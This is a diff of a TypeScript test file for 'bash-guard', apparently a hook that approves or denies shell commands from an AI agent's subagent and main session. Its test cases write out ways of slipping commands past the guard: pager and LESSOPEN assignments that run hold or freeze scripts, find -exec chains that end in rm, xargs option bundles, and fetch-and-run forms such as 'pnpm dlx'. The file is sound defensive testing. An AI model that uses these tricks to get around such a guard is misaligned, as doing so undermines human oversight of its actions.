-    ).toBe("allow");
-  });
-});
+    test("allows a read-only tool after --max-lines with a value", async () => {
+      expect(
+        await decide("echo a | xargs --max-lines=2 cat", { subagent }),
+      ).toBe("allow");
+    });
+  },
+);
 
 // `find`の実行系の区間は、`;`か`+`で閉じる。閉じるまでの`-exec`は、その区間の引数である。
-describe("bash-guard reads the regions of find -exec by where they close", () => {
-  test("allows a -exec inside an open region, which is an argument", async () => {
-    expect(
-      await decide("find . -exec cat -exec rm {} \\;", { subagent: true }),
-    ).toBe("allow");
-  });
+describeForCallers(
+  "bash-guard reads the regions of find -exec by where they close",
+  (subagent) => {
+    test("allows a -exec inside an open region, which is an argument", async () => {
+      expect(
+        await decide("find . -exec cat -exec rm {} \\;", { subagent }),
+      ).toBe("allow");
+    });
 
-  test("denies a -exec after the region closed", async () => {
-    expect(
-      await decide("find . -exec cat {} \\; -exec rm {} \\;", {
-        subagent: true,
-      }),
-    ).toBe("deny");
-  });
+    test("denies a -exec after the region closed", async () => {
+      expect(
+        await decide("find . -exec cat {} \\; -exec rm {} \\;", {
+          subagent,
+        }),
+      ).toBe("deny");
+    });
 
-  test(
-    "finishes thousands of unclosed -exec words in time",
-    async () => {
-      const started = Date.now();
-      // 線形の走査はCIの遅さでも閾値に収まり、2乗の走査は閾値を超える。
-      const decision = await decide(`find . ${"-exec cat ".repeat(15000)}`, {
-        subagent: true,
-        now: NEVER_EXPIRES,
-      });
-      expect(decision).toBe("allow");
-      expect(Date.now() - started).toBeLessThan(WIDE_PIPELINE_LIMIT_MS);
-    },
-    WIDE_PIPELINE_TIMEOUT_MS * 2,
-  );
-});
+    test(
+      "finishes thousands of unclosed -exec words in time",
+      async () => {
+        const started = Date.now();
+        // 線形の走査はCIの遅さでも閾値に収まり、2乗の走査は閾値を超える。
+        const decision = await decide(`find . ${"-exec cat ".repeat(15000)}`, {
+          subagent,
+          now: NEVER_EXPIRES,
+        });
+        expect(decision).toBe("allow");
+        expect(Date.now() - started).toBeLessThan(WIDE_PIPELINE_LIMIT_MS);
+      },
+      WIDE_PIPELINE_TIMEOUT_MS * 2,
+    );
+  },
+);
 
 // 先頭の変数代入の値に、2度目のシェルで語を変える字が残っていれば、読めない値として拒否する。
-describe("bash-guard denies a subagent whose assignment value a second shell can reshape", () => {
-  test.each([
-    `FOO="a'b" cat x`,
-    `FOO='a"b' cat x`,
-    "FOO=a\\\\b cat x",
-    "FOO=sc*pts cat x",
-    "FOO=sc?ipts cat x",
-    "FOO=sc[a]ipts cat x",
-    "FOO={a,b} cat x",
-    `FOO='{"a":1}' cat x`,
-  ])("%s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("deny");
-  });
+describeForCallers(
+  "bash-guard denies a caller whose assignment value a second shell can reshape",
+  (subagent) => {
+    test.each([
+      `FOO="a'b" cat x`,
+      `FOO='a"b' cat x`,
+      "FOO=a\\\\b cat x",
+      "FOO=sc*pts cat x",
+      "FOO=sc?ipts cat x",
+      "FOO=sc[a]ipts cat x",
+      "FOO={a,b} cat x",
+      `FOO='{"a":1}' cat x`,
+    ])("%s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("deny");
+    });
 
-  test("allows a value with a space and no such character", async () => {
-    expect(await decide("FOO='a b' cat x", { subagent: true })).toBe("allow");
-  });
-});
+    test("allows a value with a space and no such character", async () => {
+      expect(await decide("FOO='a b' cat x", { subagent })).toBe("allow");
+    });
+  },
+);
 
 // `export`や`declare`の引数の代入も、先頭の代入と同じに値を調べる。
-describe("bash-guard checks the assignments that export and declare carry", () => {
-  test.each([
-    "export TARGET=scripts/hold.ts",
-    "declare X=hold:release",
-    "readonly PAGER=scripts/freeze.ts",
-    "local -x X=push:prune",
-  ])("denies %s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("deny");
-  });
+describeForCallers(
+  "bash-guard checks the assignments that export and declare carry",
+  (subagent) => {
+    test.each([
+      "export TARGET=scripts/hold.ts",
+      "declare X=hold:release",
+      "readonly PAGER=scripts/freeze.ts",
+      "local -x X=push:prune",
+    ])("denies %s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("deny");
+    });
 
-  test("allows export of an unrelated value", async () => {
-    expect(await decide("export CI=1", { subagent: true })).toBe("allow");
-  });
-});
+    test("allows export of an unrelated value", async () => {
+      expect(await decide("export CI=1", { subagent })).toBe("allow");
+    });
+  },
+);
 
 // 直接の呼び出しと、語を足さない読み取りは、今までどおり通す。
-describe("bash-guard keeps allowing direct reads and the list command of the hold code", () => {
-  test.each([
-    "cat scripts/hold.ts",
-    "rg -n release scripts/hold.ts",
-    "git add scripts/hold.ts",
-    "git log -- scripts/freeze.ts",
-    "pip freeze",
-    "git commit -m 'freeze deps'",
-    "bun scripts/hold.ts list",
-    "mise run hold:list",
-    "mise run freeze:place -- --target a/b",
-    "bunx biome check scripts/hold.ts",
-  ])("%s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("allow");
-  });
-});
+describeForCallers(
+  "bash-guard keeps allowing direct reads and the list command of the hold code",
+  (subagent) => {
+    test.each([
+      "cat scripts/hold.ts",
+      "rg -n release scripts/hold.ts",
+      "git add scripts/hold.ts",
+      "git log -- scripts/freeze.ts",
+      "pip freeze",
+      "git commit -m 'freeze deps'",
+      "bun scripts/hold.ts list",
+      "mise run hold:list",
+      "mise run freeze:place -- --target a/b",
+      "bunx biome check scripts/hold.ts",
+    ])("%s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("allow");
+    });
+  },
+);
 
 // 先頭の変数代入の値が保留や凍結のコード、書き込みのタスク名を指していれば、実行する側によらず拒否する。
 // ページャーや`LESSOPEN`のような環境変数は、値をコマンドとして実行できるためである。
-describe("bash-guard denies a subagent whose variable assignment names the hold or freeze code", () => {
-  test.each([
-    "TARGET=scripts/hold.ts bunx biome check src",
-    "GIT_PAGER='bun scripts/hold.ts release 1' git log",
-    "GIT_PAGER=scripts/freeze.ts git log",
-    "LESSOPEN='| mise run freeze:reset' less x",
-    "X=hold:release git log",
-    "X=push:prune true",
-    "X={scripts/hold.ts,release} true",
-    "env TARGET=scripts/hold.ts true",
-    "A=1 B=./scripts/hold_psql.ts cat x",
-  ])("%s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("deny");
-  });
-
-  test.each([
-    "GIT_PAGER=cat git log",
-    "CI=1 mise run check",
-    "LEFTHOOK_EXCLUDE=wmill-metadata git commit -m x",
-    "X=scripts/hold.test.ts bun test",
-  ])("allows %s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("allow");
-  });
-});
-
-// 判定が変わるのはsubagentだけである。主セッションは今までどおり実行できる。
-describe("bash-guard leaves the main session free to add words and assign values", () => {
-  test.each([
-    "echo a | xargs vim",
-    "find . -exec vim {} +",
-    "parallel echo ::: a",
-    "watch -n 1 cat x",
-    "strace -f cat x",
-    "TARGET=scripts/hold.ts bunx biome check src",
-  ])("%s", async (command) => {
-    expect(await decide(command)).toBe("allow");
-  });
-});
-
-describe("bash-guard explains a denial of a command that adds words", () => {
-  test("names the contexts that add words and the tools it lets through", async () => {
-    const reason = await denyReason("echo a | xargs vim", { subagent: true });
-    expect(reason).toContain("adds words at run time");
-  });
-
-  test("tells how to run the read-only tool directly", async () => {
-    const reason = await denyReason("find . -exec vim {} +", {
-      subagent: true,
+describeForCallers(
+  "bash-guard denies a caller whose variable assignment names the hold or freeze code",
+  (subagent) => {
+    test.each([
+      "TARGET=scripts/hold.ts bunx biome check src",
+      "GIT_PAGER='bun scripts/hold.ts release 1' git log",
+      "GIT_PAGER=scripts/freeze.ts git log",
+      "LESSOPEN='| mise run freeze:reset' less x",
+      "X=hold:release git log",
+      "X=push:prune true",
+      "X={scripts/hold.ts,release} true",
+      "env TARGET=scripts/hold.ts true",
+      "A=1 B=./scripts/hold_psql.ts cat x",
+    ])("%s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("deny");
     });
-    expect(reason).toContain("cat, head, tail");
-  });
 
-  test("names the xargs option it does not know", async () => {
-    const reason = await denyReason("echo a | xargs --future-flag grep x", {
-      subagent: true,
+    test.each([
+      "GIT_PAGER=cat git log",
+      "CI=1 mise run check",
+      "LEFTHOOK_EXCLUDE=wmill-metadata git commit -m x",
+      "X=scripts/hold.test.ts bun test",
+    ])("allows %s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("allow");
     });
-    expect(reason).toContain("xargs option");
-  });
+  },
+);
 
-  test("names the assignment as the cause", async () => {
-    const reason = await denyReason("TARGET=scripts/hold.ts true", {
-      subagent: true,
+describeForCallers(
+  "bash-guard explains a denial of a command that adds words",
+  (subagent) => {
+    test("names the contexts that add words and the tools it lets through", async () => {
+      const reason = await denyReason("echo a | xargs vim", { subagent });
+      expect(reason).toContain("adds words at run time");
     });
-    expect(reason).toContain("variable assignment");
-  });
-});
+
+    test("tells how to run the read-only tool directly", async () => {
+      const reason = await denyReason("find . -exec vim {} +", {
+        subagent,
+      });
+      expect(reason).toContain("cat, head, tail");
+    });
+
+    test("names the xargs option it does not know", async () => {
+      const reason = await denyReason("echo a | xargs --future-flag grep x", {
+        subagent,
+      });
+      expect(reason).toContain("xargs option");
+    });
+
+    test("names the assignment as the cause", async () => {
+      const reason = await denyReason("TARGET=scripts/hold.ts true", {
+        subagent,
+      });
+      expect(reason).toContain("variable assignment");
+    });
+  },
+);
 
 // 判定の締め切り。`evaluateBashGuard`の開始から測り、超えたら判定できないものとして拒否する。
 // 時計は偽物で固定する。最初の読み取りが開始の時刻、以後の読み取りが経過後の時刻である。
-describe("bash-guard stops checking a subagent command after its deadline", () => {
+describe("bash-guard stops checking a command after its deadline", () => {
   const deps: GuardDeps = {
     currentBranch: () => "feature",
     repoRoot: () => "/repo",
@@ -3699,8 +4032,19 @@ describe("bash-guard stops checking a subagent command after its deadline", () =
     );
   });
 
-  test("leaves the main session alone after the deadline", () => {
-    expect(evaluateAfter("cat x", 60000, null).kind).toBe("allow");
+  test("denies a read of the main session after the deadline", () => {
+    expect(evaluateAfter("cat x", 7000, null).kind).toBe("deny");
+  });
+
+  test("allows a read of the main session within the deadline", () => {
+    expect(evaluateAfter("cat x", 5000, null).kind).toBe("allow");
+  });
+
+  test("says the time limit ran out in the reason for the main session", () => {
+    const decision = evaluateAfter("cat x", 7000, null);
+    expect(decision.kind === "deny" ? decision.reason : "").toContain(
+      "time limit",
+    );
   });
 
   test("measures the deadline again for every command on the line", () => {
@@ -3714,116 +4058,158 @@ describe("bash-guard stops checking a subagent command after its deadline", () =
 });
 
 // GNUの`xargs`の`-e`と`-l`は、値が同じ語に付く省略できる値を取る。束の中に置くと、値の字の読み方が変わるので、知らない字として拒否する。
-describe("bash-guard denies a subagent whose xargs bundle holds the optional-value letters", () => {
-  test.each([
-    "echo a | xargs -en flock cat",
-    "echo a | xargs -eE flock cat",
-    "echo a | xargs -eI flock cat",
-    "echo a | xargs -0en flock cat",
-    "echo a | xargs -ten flock cat",
-    "echo a | xargs -e cat",
-    "echo a | xargs -l2 cat",
-    "echo a | xargs -enx cat",
-  ])("%s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("deny");
-  });
+describeForCallers(
+  "bash-guard denies a caller whose xargs bundle holds the optional-value letters",
+  (subagent) => {
+    test.each([
+      "echo a | xargs -en flock cat",
+      "echo a | xargs -eE flock cat",
+      "echo a | xargs -eI flock cat",
+      "echo a | xargs -0en flock cat",
+      "echo a | xargs -ten flock cat",
+      "echo a | xargs -e cat",
+      "echo a | xargs -l2 cat",
+      "echo a | xargs -enx cat",
+    ])("%s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("deny");
+    });
 
-  test("keeps reading a bundle that ends in a letter taking a value", async () => {
-    expect(await decide("echo a | xargs -0nx cat", { subagent: true })).toBe(
-      "allow",
-    );
-  });
-});
+    test("keeps reading a bundle that ends in a letter taking a value", async () => {
+      expect(await decide("echo a | xargs -0nx cat", { subagent })).toBe(
+        "allow",
+      );
+    });
+  },
+);
 
 // `bun exec`は文字列をシェルのコードとして実行する。`find`の後ろでは、検査の道具の前に置ける語から外す。
-describe("bash-guard reads exec after a runner behind find as code", () => {
-  test("denies bun exec in front of an inspection tool", async () => {
-    expect(
-      await decide("find . -exec bun exec tsc {} +", { subagent: true }),
-    ).toBe("deny");
-  });
+describeForCallers(
+  "bash-guard reads exec after a runner behind find as code",
+  (subagent) => {
+    test("denies bun exec in front of an inspection tool", async () => {
+      expect(await decide("find . -exec bun exec tsc {} +", { subagent })).toBe(
+        "deny",
+      );
+    });
 
-  test("allows bun run in front of an inspection tool", async () => {
-    expect(
-      await decide("find . -exec bun run tsc {} +", { subagent: true }),
-    ).toBe("allow");
-  });
-});
+    test("allows bun run in front of an inspection tool", async () => {
+      expect(await decide("find . -exec bun run tsc {} +", { subagent })).toBe(
+        "allow",
+      );
+    });
+  },
+);
 
 // `npm x`は`npm exec`の別名で、`pnpm dlx`は取得して実行する。`find`の後ろでは、検査の道具の前に読み飛ばす語は`run`だけである。
-describe("bash-guard reads only run as the word in front of an inspection tool behind find", () => {
-  test.each([
-    "find . -exec npm x tsc {} +",
-    "find . -exec pnpm dlx biome {} +",
-    "find . -exec bun x biome check {} +",
-  ])("denies %s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("deny");
-  });
-});
+describeForCallers(
+  "bash-guard reads only run as the word in front of an inspection tool behind find",
+  (subagent) => {
+    test.each([
+      "find . -exec npm x tsc {} +",
+      "find . -exec pnpm dlx biome {} +",
+      "find . -exec bun x biome check {} +",
+    ])("denies %s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("deny");
+    });
+  },
+);
 
-describe("bash-guard says what made an xargs or a find denied", () => {
-  const reasonOf = (command: string) => denyReason(command, { subagent: true });
+describeForCallers(
+  "bash-guard says what made an xargs or a find denied",
+  (subagent) => {
+    const reasonOf = (command: string) => denyReason(command, { subagent });
 
-  test("names an assignment after xargs", async () => {
-    expect(await reasonOf("ls | xargs FOO=1 cat")).toContain(
-      "assignment after xargs",
-    );
-  });
+    test("names an assignment after xargs", async () => {
+      expect(await reasonOf("ls | xargs FOO=1 cat")).toContain(
+        "assignment after xargs",
+      );
+    });
 
-  test("names a relative path for the program", async () => {
-    expect(await reasonOf("ls | xargs ./cat")).toContain("relative path");
-  });
+    test("names a relative path for the program", async () => {
+      expect(await reasonOf("ls | xargs ./cat")).toContain("relative path");
+    });
 
-  test("names a {} in front of the command of find", async () => {
-    expect(await reasonOf("find . -exec {} \\;")).toContain(
-      "{} in the place of the program",
-    );
-  });
+    test("names a {} in front of the command of find", async () => {
+      expect(await reasonOf("find . -exec {} \\;")).toContain(
+        "{} in the place of the program",
+      );
+    });
 
-  test("asks the main session or a person once in the assignment reason", async () => {
-    const reason = await reasonOf("TARGET=scripts/hold.ts true");
-    expect(reason.split("ask the main session or a person").length - 1).toBe(1);
-  });
-});
+    test("asks the main session or a person once in the assignment reason", async () => {
+      const reason = await reasonOf("TARGET=scripts/hold.ts true");
+      expect(reason.split("ask the main session or a person").length - 1).toBe(
+        1,
+      );
+    });
+  },
+);
 
-describe("bash-guard checks every region that find -exec closes with a plus", () => {
-  test("denies a second region after a region closed with a plus", async () => {
-    expect(
-      await decide("find . -exec cat {} + -exec rm {} +", { subagent: true }),
-    ).toBe("deny");
-  });
-});
+describeForCallers(
+  "bash-guard checks every region that find -exec closes with a plus",
+  (subagent) => {
+    test("denies a second region after a region closed with a plus", async () => {
+      expect(
+        await decide("find . -exec cat {} + -exec rm {} +", { subagent }),
+      ).toBe("deny");
+    });
+  },
+);
 
 // 代入の値の拒否と、後ろの保留の操作の拒否が重なるときは、強い方の`operation`の理由を返す。
-describe("bash-guard gives the strongest reason when an assignment and an operation overlap", () => {
-  test("gives the operation reason when a hold release follows an unreadable assignment", async () => {
-    const reason = await denyReason(`FOO="a'b" ./scripts/hold.ts release 1`, {
-      subagent: true,
+describeForCallers(
+  "bash-guard gives the strongest reason when an assignment and an operation overlap",
+  (subagent) => {
+    test.skipIf(!subagent)(
+      "gives the operation reason when a hold release follows an unreadable assignment",
+      async () => {
+        const reason = await denyReason(
+          `FOO="a'b" ./scripts/hold.ts release 1`,
+          {
+            subagent,
+          },
+        );
+        expect(reason).toContain("Ask the main session or a person to run");
+      },
+    );
+
+    test.skipIf(subagent)(
+      "gives the main session reason when a hold release follows an unreadable assignment",
+      async () => {
+        const reason = await denyReason(
+          `FOO="a'b" ./scripts/hold.ts release 1`,
+          {
+            subagent,
+          },
+        );
+        expect(reason).toContain("single line");
+      },
+    );
+
+    test("does not give the assignment reason for that overlap", async () => {
+      const reason = await denyReason(`FOO="a'b" ./scripts/hold.ts release 1`, {
+        subagent,
+      });
+      expect(reason).not.toContain("variable assignment");
     });
-    expect(reason).toContain("Ask the main session or a person to run");
-  });
 
-  test("does not give the assignment reason for that overlap", async () => {
-    const reason = await denyReason(`FOO="a'b" ./scripts/hold.ts release 1`, {
-      subagent: true,
+    test("keeps the assignment reason for an assignment alone", async () => {
+      const reason = await denyReason(`FOO="a'b" true`, { subagent });
+      expect(reason).toContain("variable assignment");
     });
-    expect(reason).not.toContain("variable assignment");
-  });
 
-  test("keeps the assignment reason for an assignment alone", async () => {
-    const reason = await denyReason(`FOO="a'b" true`, { subagent: true });
-    expect(reason).toContain("variable assignment");
-  });
+    test("keeps the assignment reason when a read follows", async () => {
+      const reason = await denyReason(`FOO="a'b" cat x`, { subagent });
+      expect(reason).toContain("variable assignment");
+    });
+  },
+);
 
-  test("keeps the assignment reason when a read follows", async () => {
-    const reason = await denyReason(`FOO="a'b" cat x`, { subagent: true });
-    expect(reason).toContain("variable assignment");
-  });
-});
-
-describe("bash-guard explains which characters make an assignment value unreadable", () => {
-  test("names quotes, backslashes, and pattern characters in the reason", async () => {
-    const reason = await denyReason(`FOO="a'b" cat x`, { subagent: true });
-    expect(reason).toContain("backslash");
-  });
-});
+describeForCallers(
+  "bash-guard explains which characters make an assignment value unreadable",
+  (subagent) => {
+    test("names quotes, backslashes, and pattern characters in the reason", async () => {
+      const reason = await denyReason(`FOO="a'b" cat x`, { subagent });
+      expect(reason).toContain("backslash");
+    });
+  },
+);
